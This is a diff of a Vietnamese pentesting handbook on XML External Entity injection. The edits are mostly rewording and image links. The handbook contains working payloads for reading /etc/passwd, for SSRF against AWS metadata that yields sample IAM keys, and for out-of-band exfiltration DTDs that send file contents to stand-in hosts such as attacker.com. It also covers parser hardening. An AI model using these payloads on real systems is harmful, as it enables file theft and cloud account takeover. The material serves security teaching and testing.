@@ -1,9 +1,11 @@
 # XML External Entity (XXE) Injection - Sổ Tay Thực Chiến & Toàn Tập Kiến Thức
 
-> [!NOTE] Cốt lõi về XXE (Mental Model của tôi)
+> [!NOTE] Cốt lõi về XXE (Mental Model của mình)
 > **Bản chất của XXE là gì?** 
-> XML sinh ra để truyền tải dữ liệu, nhưng chuẩn XML cổ điển lại cho phép định nghĩa các "biến đại diện" gọi là **Entities** thông qua DTD (Document Type Definition). 
-> Khi lập trình viên dùng một XML parser mà **quên tắt tính năng phân giải thực thể ngoài (External Entities)**, kẻ tấn công (tôi hoặc bạn) có thể ép parser đọc file trên máy chủ (`file:///etc/passwd`) hoặc ép máy chủ tự gửi request HTTP đến các mạng nội bộ nhạy cảm (**SSRF**).
+> XML sinh ra để lưu trữ và truyền tải dữ liệu, nhưng chuẩn XML cổ điển lại cho phép định nghĩa các "biến đại diện" gọi là **Entities** thông qua DTD (Document Type Definition). 
+> Khi lập trình viên dùng một XML parser mà **quên tắt tính năng phân giải thực thể ngoài (External Entities)**, kẻ tấn công (như mình hoặc bạn) có thể ép parser đọc file trên máy chủ (`file:///etc/passwd`) hoặc ép máy chủ tự gửi request HTTP đến các mạng nội bộ nhạy cảm (**SSRF**).
+
+![Mô hình tổng quan kiến trúc XXE Injection](images/xxe-injection.svg)
 
 ---
 
@@ -40,7 +42,7 @@ XML External Entity (XXE) Injection
 │   ├── 3.2. File Upload Attacks (SVG images, file DOCX / XLSX / PPTX)
 │   └── 3.3. Content-Type Swapping (Ép endpoint JSON/Form nhận XML)
 │
-├── 4. Methodology & Checklist Đi Săn Của Tôi
+├── 4. Methodology & Checklist Đi Săn Của Mình
 │   ├── Bước 1: Fingerprint parser & công nghệ backend
 │   ├── Bước 2: Test thăm dò Entity Expansion thông thường
 │   ├── Bước 3: Thử In-band file read / SSRF
@@ -59,11 +61,11 @@ XML External Entity (XXE) Injection
 
 ## 2. Nền Tảng XML & DTD: "Hiểu Bản Chất Trước Khi Gõ Lệnh"
 
-Khi mới học Web Security, tôi thường chỉ thuộc vẹt payload `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`. Nhưng khi gặp các hệ thống thực tế hoặc WAF lọc từ khóa, nếu không hiểu XML hoạt động thế nào thì chịu chết. Dưới đây là cách tôi hệ thống lại những khái niệm này một cách trực quan nhất.
+Khi mới bắt đầu học Web Security, mình thường chỉ học vẹt payload `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`. Nhưng khi gặp các hệ thống thực tế hoặc WAF lọc từ khóa, nếu không hiểu sâu bản chất XML hoạt động thế nào thì rất dễ bế tắc. Dưới đây là cách mình hệ thống lại những khái niệm này một cách trực quan và dễ nhớ nhất.
 
 ### XML và Entity là cái gì?
 XML (Extensible Markup Language) là định dạng dữ liệu có cấu trúc thẻ.
-Trong XML, **XML Entity** giống hệt một **biến** trong lập trình. Khi bạn định nghĩa một entity, bạn có thể tái sử dụng nó nhiều lần ở bất cứ đâu trong file XML.
+Trong XML, **XML Entity** giống hệt một **biến** trong ngôn ngữ lập trình. Khi mình định nghĩa một entity, mình có thể gọi lại nó nhiều lần ở bất cứ đâu trong thân file XML.
 
 Ví dụ thông thường:
 ```xml
@@ -74,17 +76,17 @@ Ví dụ thông thường:
 <note>
   <to>Security Team</to>
   <from>&author;</from> <!-- Parser sẽ tự thay &author; thành "Tài Nguyễn" -->
-  <message>Hôm nay chúng ta săn bug XXE nhé!</message>
+  <message>Hôm nay chúng mình cùng săn bug XXE nhé!</message>
 </note>
 ```
 
 ### DTD (Document Type Definition) là gì?
-DTD là bản thiết kế quy định cấu trúc của tài liệu XML (gồm các thẻ nào, kiểu dữ liệu gì, và có những thực thể nào được khai báo). DTD có thể:
+DTD là bản thiết kế quy định ngữ pháp cho tài liệu XML (gồm các thẻ nào, kiểu dữ liệu gì, và có những thực thể nào được khai báo). DTD có thể:
 1. Được viết trực tiếp bên trong file XML (**Internal DTD**) thông qua `<!DOCTYPE root_element [...]>`.
 2. Hoặc được tải từ bên ngoài (**External DTD**) thông qua `SYSTEM "http://..."` hoặc `SYSTEM "file://..."`.
 
-### External Entity (Thực thể ngoài) - Nguồn cơn của mọi tội lỗi
-Thay vì gán cứng giá trị cho Entity là chuỗi `"Tài Nguyễn"`, chuẩn XML cho phép dùng từ khóa `SYSTEM` kèm theo một URI để nạp nội dung từ bên ngoài:
+### External Entity (Thực thể ngoài) - Nguồn gốc sinh ra lỗ hổng
+Thay vì gán cứng giá trị cho Entity là chuỗi chữ bình thường, chuẩn XML cho phép dùng từ khóa `SYSTEM` kèm theo một đường dẫn URI để nạp nội dung từ bên ngoài:
 
 ```xml
 <!ENTITY myExternalVariable SYSTEM "file:///etc/passwd">
@@ -108,10 +110,12 @@ flowchart TD
 
 ## 3. Khai Thác XXE Trực Tiếp: Đọc File Cục Bộ (In-Band File Retrieval)
 
-Đây là kịch bản "ngon ăn" nhất mà tôi hay gặp trong các bài lab PortSwigger và các ứng dụng doanh nghiệp cũ: **Kết quả của thẻ XML được server in thẳng ra màn hình**.
+Đây là kịch bản thuận lợi nhất mà mình hay gặp trong các bài lab PortSwigger và các ứng dụng doanh nghiệp: **Dữ liệu phân giải từ thẻ XML được server in thẳng ra màn hình**.
+
+![Mô hình khai thác In-Band XXE đọc file hệ thống](images/xxe-file-retrieval.svg)
 
 ### Kịch bản thực tế: Check tồn kho (Check Stock)
-Giả sử tôi thấy một request kiểm tra hàng tồn kho gửi lên bằng XML:
+Giả sử mình bắt được một request kiểm tra hàng tồn kho gửi lên bằng XML qua Burp Suite:
 
 ```http
 POST /product/stock HTTP/1.1
@@ -134,8 +138,8 @@ Content-Type: text/plain
 52 units available
 ```
 
-### Cách tôi tấn công đọc `/etc/passwd`:
-Tôi chèn một khối `<!DOCTYPE>` định nghĩa thực thể `xxe` trỏ vào file `/etc/passwd`, sau đó thay giá trị bên trong thẻ `<productId>` bằng `&xxe;`:
+### Cách mình tấn công đọc `/etc/passwd`:
+Mình chèn một khối `<!DOCTYPE>` định nghĩa thực thể `xxe` trỏ vào file `/etc/passwd`, sau đó thay giá trị bên trong thẻ `<productId>` bằng `&xxe;`:
 
 ```http
 POST /product/stock HTTP/1.1
@@ -151,7 +155,7 @@ Content-Length: 198
 </stockCheck>
 ```
 
-Nếu server bị lỗi, parser sẽ đọc toàn bộ nội dung file `/etc/passwd` thay vào vị trí `<productId>` và thông báo:
+Nếu server chưa tắt external entities, parser sẽ đọc toàn bộ nội dung file `/etc/passwd` thay vào vị trí `<productId>` và phản hồi:
 ```http
 HTTP/1.1 200 OK
 Content-Type: text/plain
@@ -163,30 +167,18 @@ ti:x:1000:1000:ti:/home/ti:/bin/bash
 ```
 
 > [!TIP] Lưu ý cho Windows Server
-> Nếu mục tiêu chạy Windows (IIS, .NET), tôi sẽ đổi đường dẫn sang:
+> Nếu mục tiêu chạy Windows (IIS, .NET), mình sẽ đổi đường dẫn sang:
 > `<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">` hoặc `file:///C:/boot.ini`.
 
 ---
 
 ## 4. Khai Thác XXE Để Thực Hiện SSRF (Server-Side Request Forgery)
 
-Nếu target chạy trên hạ tầng Cloud (AWS, Azure, GCP) hoặc nằm sau một mạng riêng với nhiều service nội bộ, tôi luôn ưu tiên biến XXE thành SSRF.
+Nếu target chạy trên hạ tầng Cloud (AWS, Azure, GCP) hoặc nằm sau mạng riêng nội bộ, mình luôn ưu tiên biến XXE thành SSRF để nâng mức độ nghiêm trọng của bug lên Critical.
 
-```mermaid
-sequenceDiagram
-    autonumber
-    actor Attacker as Attacker (Tôi)
-    participant Server as Target Server (Vulnerable)
-    participant Metadata as AWS Metadata (169.254.169.254)
+![Mô hình khai thác SSRF qua XXE chọc vào Cloud Metadata](images/xxe-ssrf-metadata.svg)
 
-    Attacker->>Server: POST XML với SYSTEM "http://169.254.169.254/latest/meta-data/"
-    Server->>Metadata: GET http://169.254.169.254/latest/meta-data/
-    Metadata-->>Server: Trả về danh sách thư mục metadata (iam/, instance-id, ...)
-    Server-->>Attacker: In danh sách metadata vào response
-    Note over Attacker,Metadata: Tiếp tục đọc IAM Secret Keys để chiếm toàn bộ quyền Cloud!
-```
-
-### Payload khai thác AWS Metadata:
+### Payload khai thác AWS EC2 Metadata:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE test [ 
@@ -198,7 +190,7 @@ sequenceDiagram
 </stockCheck>
 ```
 
-Khi server phản hồi, tôi nhận ngay bộ Secret Access Key và Token của EC2 role:
+Khi server phản hồi, mình nhận ngay bộ Secret Access Key và Token của EC2 IAM role:
 ```json
 {
   "Code" : "Success",
@@ -209,21 +201,21 @@ Khi server phản hồi, tôi nhận ngay bộ Secret Access Key và Token của
   "Token" : "AQoDYXdzEJr1..."
 }
 ```
-Từ đây bug nhảy từ Medium/High lên thẳng **Critical ($10,000+)**!
+Từ đây bug nhảy từ Medium/High lên thẳng **Critical ($10,000+)** vì mình có thể chiếm toàn quyền kiểm soát tài khoản Cloud của công ty mục tiêu!
 
 ---
 
-## 5. Blind XXE: "Khi Server Im Lặng, Ta Làm Gì?"
+## 5. Blind XXE: "Khi Server Không Trả Về Kết Quả, Mình Làm Gì?"
 
-Trong thực tế, 80% trường hợp ứng dụng parse XML nhưng **không hề in giá trị của thẻ ra màn hình** (hoặc chỉ trả về `{"status": "success"}`). Đây gọi là **Blind XXE**.
+Trong thực tế đi pentest và săn bug bounty, hơn 80% trường hợp ứng dụng parse XML nhưng **không hề in giá trị của thẻ ra màn hình** (hoặc chỉ trả về `{"status": "success"}`). Đây gọi là **Blind XXE**.
 
-Để xử lý Blind XXE, tôi có 3 đòn thế chính:
+Để xử lý Blind XXE, mình áp dụng 3 đòn thế chính:
 1. **Dò tìm OOB (Out-Of-Band)**: Xác nhận parser có chịu gọi ra ngoài không.
 2. **Rút trích dữ liệu qua External DTD**: Dùng tham số `%` (Parameter Entity) để kéo file gửi về server của mình.
 3. **Khai thác qua Error Message (Error-based)**: Cố ý ném lỗi để server in nội dung file vào log / stack trace.
 
 ### 5.1. Dò tìm Blind XXE bằng Burp Collaborator
-Đầu tiên, tôi test xem parser có gửi HTTP hoặc DNS lookup ra ngoài không:
+Đầu tiên, mình test xem parser có gửi HTTP hoặc DNS lookup ra ngoài không:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -237,54 +229,37 @@ Trong thực tế, 80% trường hợp ứng dụng parse XML nhưng **không h�
 ```
 
 > [!IMPORTANT] Parameter Entities (Thực thể tham số)
-> Một số parser chặn việc gọi General Entity (`&xxe;`) bên trong thân XML. Lúc này, tôi chuyển sang dùng **XML Parameter Entities** với ký tự `%`. Parameter entity chỉ được dùng trong nội bộ DTD:
+> Một số parser chặn việc gọi General Entity (`&xxe;`) bên trong thân XML. Lúc này, mình chuyển sang dùng **XML Parameter Entities** với ký tự `%`. Parameter entity chỉ được dùng trong nội bộ DTD:
 > ```xml
 > <!DOCTYPE stockCheck [ 
 >   <!ENTITY % xxe SYSTEM "http://attacker-collaborator.net/ping"> 
 >   %xxe; 
 > ]>
 > ```
-> Khi thấy DNS hoặc HTTP interaction báo về trên Burp Collaborator, tôi chắc chắn 100% mục tiêu dính Blind XXE!
+> Khi thấy DNS hoặc HTTP interaction báo về trên Burp Collaborator, mình chắc chắn 100% mục tiêu dính Blind XXE!
 
 ---
 
 ### 5.2. Rút trích dữ liệu ra ngoài (Data Exfiltration via OOB)
 
-Đây là kỹ thuật tinh tế nhất. Do chuẩn XML cấm gọi Parameter Entity lồng nhau ngay trong Internal DTD, tôi phải host một file DTD độc hại trên server của mình (**External DTD**).
+Đây là kỹ thuật tinh tế nhất. Do chuẩn XML cấm gọi Parameter Entity lồng nhau ngay trong Internal DTD, mình phải host một file DTD độc hại trên server của mình (**External DTD**).
 
-```text
-SƠ ĐỒ TẤN CÔNG BLIND XXE QUA EXTERNAL DTD:
+![Mô hình Blind XXE rút trích dữ liệu qua External DTD](images/blind-xxe-oob-dtd.svg)
 
-[Máy của tôi (Attacker Server)]
-         │
-         │ Host sẵn file "malicious.dtd"
-         ▼
-<!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?leak=%file;'>">
-%eval;
-%exfil;
-
-[Target Server]
-   1. Nhận XML request -> Tải malicious.dtd từ máy attacker
-   2. malicious.dtd yêu cầu đọc file /etc/hostname
-   3. malicious.dtd ép server gửi HTTP request: GET http://attacker.com/?leak=ubuntu-prod-01
-   4. Attacker đọc file trong access log!
-```
-
-#### Bước 1: Host file `malicious.dtd` trên máy chủ hoặc Burp Collaborator:
+#### Bước 1: Host file `evil.dtd` trên máy chủ hoặc Burp Collaborator:
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker-collaborator.net/?data=%file;'>">
 %eval;
 %exfiltrate;
 ```
-*(Ghi chú: `&#x25;` chính là mã hex của ký tự `%`, phải encode để parser không bị nhầm lẫn khi nạp `malicious.dtd`)*.
+*(Ghi chú: `&#x25;` chính là mã hex của ký tự `%`, phải encode để parser không bị nhầm lẫn khi nạp `evil.dtd`)*.
 
 #### Bước 2: Gửi request XML lên mục tiêu:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY % ext SYSTEM "http://attacker.com/malicious.dtd">
+  <!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd">
   %ext;
 ]>
 <stockCheck>
@@ -293,7 +268,7 @@ SƠ ĐỒ TẤN CÔNG BLIND XXE QUA EXTERNAL DTD:
 </stockCheck>
 ```
 
-Ngay lập tức, server mục tiêu sẽ tải `malicious.dtd`, thực thi logic, và gửi nội dung `/etc/hostname` thẳng vào log HTTP của tôi!
+Ngay lập tức, server mục tiêu sẽ tải `evil.dtd`, thực thi logic, và gửi nội dung `/etc/hostname` thẳng vào log HTTP của mình!
 
 ---
 
@@ -301,9 +276,9 @@ Ngay lập tức, server mục tiêu sẽ tải `malicious.dtd`, thực thi logi
 
 Nếu server mục tiêu nằm sau một Firewall cực gắt **chặn mọi kết nối đi ra ngoài (Egress Filtering)**, phương án OOB Collaborator sẽ tịt ngòi. 
 
-Lúc này, tôi sẽ ép parser gây ra một **lỗi phân giải đường dẫn file không tồn tại**, và nhét nội dung của file nhạy cảm vào chính đường dẫn bị lỗi đó!
+Lúc này, mình sẽ ép parser gây ra một **lỗi phân giải đường dẫn file không tồn tại**, và nhét nội dung của file nhạy cảm vào chính đường dẫn bị lỗi đó!
 
-File `error.dtd` tôi host (hoặc nhúng):
+File `error.dtd` mình host (hoặc nhúng):
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///khong_co_file_nay/%file;'>">
@@ -326,13 +301,13 @@ Một ngày đẹp trời, bạn gặp một server:
 2. Không thể load External DTD từ xa.
 3. Không in kết quả trực tiếp ra response.
 
-Liệu có bó tay? **Không!**
+Liệu có bó tay? **Hoàn toàn không!**
 
 > [!NOTE] Bí kíp của James Kettle & PortSwigger
 > Trên hệ điều hành (Linux/Windows) luôn có sẵn các file DTD cục bộ đi kèm phần mềm mặc định (ví dụ GNOME Yelp DTD trên Linux, hoặc font DTD). 
 > Kỹ thuật ở đây là: **Tái sử dụng (Repurpose) một file DTD có sẵn trên server**, ghi đè (redefine) một entity có sẵn trong file đó để kích hoạt Error-based XXE mà không cần gửi bất kỳ gói tin nào ra mạng ngoài!
 
-Ví dụ trên các bản phân phối Linux thường có file `/usr/share/yelp/dtd/docbookx.dtd`. Trong file này có định nghĩa sẵn entity tên là `ISOamso`. Tôi sẽ ghi đè nó như sau:
+Ví dụ trên các bản phân phối Linux thường có file `/usr/share/yelp/dtd/docbookx.dtd`. Trong file này có định nghĩa sẵn entity tên là `ISOamso`. Mình sẽ ghi đè nó như sau:
 
 ```xml
 <!DOCTYPE foo [
@@ -357,8 +332,10 @@ Ví dụ trên các bản phân phối Linux thường có file `/usr/share/yelp
 
 ## 6. Bề Mặt Tấn Công Ẩn (Hidden Attack Surface)
 
-Rất nhiều bạn bảo tôi: *"Website em test toàn gửi JSON hoặc Form dữ liệu, làm gì có thẻ `<?xml` nào mà test XXE?"*. 
-Đừng để bề nổi đánh lừa! Dưới đây là 3 kỹ thuật tôi luôn thử khi không thấy XML hiển thị lộ liễu:
+Rất nhiều bạn hỏi mình: *"Website mình test toàn gửi JSON hoặc Form dữ liệu, làm gì có thẻ `<?xml` nào mà test XXE?"*. 
+Đừng để bề nổi đánh lừa! Dưới đây là 3 kỹ thuật mình luôn kiểm tra khi không thấy XML hiển thị lộ liễu:
+
+![3 Bề mặt tấn công XXE tiềm ẩn](images/xxe-hidden-surface.svg)
 
 ### 6.1. XInclude Attacks: Khi chỉ kiểm soát một phần XML
 Trong các kiến trúc backend dùng SOAP hoặc microservices, frontend chỉ nhận tham số của bạn (ví dụ `productId=123`) rồi tự ráp vào một XML template có sẵn:
@@ -421,7 +398,7 @@ Content-Type: application/json
 {"username": "admin", "email": "test@test.com"}
 ```
 
-Tôi thử đổi thành:
+Mình thử đổi sang:
 ```http
 POST /api/user/update HTTP/1.1
 Host: target.com
@@ -440,7 +417,7 @@ Nếu backend có cài thư viện parse XML và chưa cấu hình chặt, nó s
 
 ## 7. Bảng Tóm Tắt Khả Năng Bị Lỗi Theo Từng Công Nghệ (2026 Ecosystem)
 
-Không phải parser nào cũng dính lỗi theo cùng một cách. Bảng dưới đây giúp tôi tiết kiệm hàng giờ test vu vơ:
+Không phải parser nào cũng dính lỗi theo cùng một cách. Bảng dưới đây giúp mình tiết kiệm hàng giờ test vu vơ:
 
 | Ngôn ngữ / Parser | Hành vi mặc định với SYSTEM entity | Dính lỗi mặc định? | Ghi chú thực chiến |
 |---|---|:---:|---|
@@ -506,7 +483,7 @@ XmlReader reader = XmlReader.Create(stream, settings);
 
 ---
 
-## 9. Tổng Kết & Lời Khuyên Của Tôi
+## 9. Tổng Kết & Lời Khuyên Của Mình
 1. **Luôn giữ tư duy đa chiều**: Khi thấy bất kỳ endpoint nào nhận dữ liệu dạng text, hãy thử đổi `Content-Type` sang XML.
-2. **Không thấy phản hồi không có nghĩa là không dính**: Blind XXE chiếm đa số trong thực tế, hãy luôn chuẩn bị sẵn Burp Collaborator hoặc máy chủ test OOB.
+2. **Không thấy phản hồi không có nghĩa là an toàn**: Blind XXE chiếm đa số trong thực tế, hãy luôn chuẩn bị sẵn Burp Collaborator hoặc máy chủ test OOB.
 3. **Thao tác có tâm khi pentest**: Khi đã xác nhận đọc được 1 dòng của `/etc/passwd` hoặc hostname, hãy dừng lại và báo cáo; không cố dump toàn bộ shadow hay tài liệu nhạy cảm nếu không có thỏa thuận cụ thể trong Scope!
